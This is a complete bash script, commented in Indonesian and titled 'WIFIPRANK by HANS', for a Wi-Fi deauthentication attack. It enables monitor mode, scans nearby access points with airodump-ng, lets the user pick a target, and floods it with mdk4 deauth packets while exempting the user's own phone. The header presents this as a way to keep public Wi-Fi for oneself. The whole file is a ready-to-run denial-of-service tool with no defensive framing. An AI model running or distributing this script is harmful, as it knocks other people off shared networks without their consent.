#!/bin/bash

# ======================================================================
# WIFIPRANK by HANS
# Gunakan Gunakan script untuk wifi publik yang akses cuma kamu doang!
# ======================================================================


# cek sudo jalan atau tidak
if [ "$EUID" -ne 0 ]; then 
  echo -e "\e[1;31m[!] Jalankan skrip ini dengan sudo!\e[0m"
  exit
fi

clear
echo -e "\e[1;36m"
echo "  _   _                 _       _ _   _              "
echo " | | | | __ _ _ __  ___| | __  (_|_) (_) _ __ _ __ _ "
echo " | |_| |/ _\` | '_ \/ __| |/ /  | | | | || '__| '__|_|"
echo " |  _  | (_| | | | \__ \   <   | | | | || |  | |    "
echo " |_| |_|\__,_|_| |_|___/_|\_\  |_|_| |_||_|  |_|    "
echo -e "         \e[1;33m~ WIFIPRANK by HANS ~\e[0m\e[0m"

# Adapter wifi usb Kamu (Edit Ya jangan Lupa)
RAW_IFACE="wlx88827910300a"
echo "[+] Membersihkan proses pengganggu..."
airmon-ng check kill > /dev/null 2>&1
rm -f /tmp/hans-scan*

echo "[+] Mengaktifkan Monitor Mode pada (jangan lupa ganti pakai usb driver kamu) $RAW_IFACE..."
airmon-ng start $RAW_IFACE > /dev/null 2>&1
MON_IFACE=$(iwconfig 2>&1 | grep "Mode:Monitor" | awk '{print $1}' | head -n 1)

if [ -z "$MON_IFACE" ]; then
    echo -e "\e[1;31m[!] Gagal masuk ke Monitor Mode.\e[0m"
    exit 1
fi

# untuk menghentikan scan
pilih_target() {
    echo -e "\n\e[1;33m[!] Scanning dihentikan. Menyiapkan daftar target...\e[0m"
    kill $SCAN_PID > /dev/null 2>&1
}
trap pilih_target SIGINT

# Scanning Jaringan
echo -e "\e[1;32m[+] Memulai pemindaian... Tekan CTRL+C jika target sudah muncul!\e[0m"
airodump-ng $MON_IFACE -w /tmp/hans-scan --output-format csv --write-interval 1 > /dev/null 2>&1 &
SCAN_PID=$!

while kill -0 $SCAN_PID 2>/dev/null; do
    clear
    echo -e "\e[1;36m[ SCANNING MODE - Tekan CTRL+C untuk memilih target ]\e[0m"
    echo -e "ID\tBSSID\t\t\tCH\tESSID"
    echo "---------------------------------------------------------------"
    if [ -f /tmp/hans-scan-01.csv ]; then
        awk -F, '/Station/ {exit} NR > 1 && $1 ~ /:/ {print $1 "," $4 "," $14}' /tmp/hans-scan-01.csv | \
        awk -F, '{printf "%d\t%s\t%s\t%s\n", NR, $1, $2, $3}' > /tmp/targets.txt
        cat /tmp/targets.txt
    fi
    sleep 2
done
trap - SIGINT

# Eksekusi Serangan
echo "---------------------------------------------------------------"
read -p "Masukkan ID Target: " TARGET_NUM
TARGET_BSSID=$(awk -v num=$TARGET_NUM '$1==num {print $2}' /tmp/targets.txt)
TARGET_CH=$(awk -v num=$TARGET_NUM '$1==num {print $3}' /tmp/targets.txt | tr -d ' ')

if [ -n "$TARGET_BSSID" ]; then
    read -p "[?] Masukkan MAC HP kamu (Agar tidak putus): " MY_HP
    
    # Kunci channel target
    iwconfig $MON_IFACE channel $TARGET_CH
    
    echo -e "\e[1;31m[!] MENYERANG $TARGET_BSSID di CH $TARGET_CH...\e[0m"
    echo -e "\e[1;32m[+] HP kamu ($MY_HP) dikecualikan dari serangan.\e[0m"
    
    # Perintah MDK4 sesuai versi Lenovo kamu:
    # d = deauth, -B = Target Router, -W = Whitelist MAC
    sudo mdk4 $MON_IFACE d -B $TARGET_BSSID -W $MY_HP
else
    echo "[!] Target tidak ditemukan."
fi

# Pembersihan
echo -e "\n[+] Selesai! Mengembalikan kartu WiFi ke mode normal..."
airmon-ng stop $MON_IFACE > /dev/null 2>&1
systemctl start NetworkManager > /dev/null 2>&1
rm -f /tmp/hans-scan* /tmp/targets.txt
echo "[+] Semua beres"


